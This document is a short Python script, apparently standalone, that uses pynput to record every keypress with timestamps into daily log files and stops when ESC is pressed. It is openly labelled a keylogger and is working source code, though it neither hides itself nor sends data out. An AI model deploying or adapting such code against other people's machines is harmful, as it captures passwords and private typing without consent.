from pynput import keyboard
from datetime import datetime
import os

log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, datetime.now().strftime("%Y-%m-%d") + ".txt")

# Global listener reference
listener = None

def format_key(key):
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    else:
        return f"[{key.name.upper()}]"

def on_press(key):
    global listener

    # Press ESC to stop keylogger
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        listener.stop()
        return

    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str = format_key(key)
    log_line = f"{timestamp} - {key_str}\n"

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_line)

# Start the keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
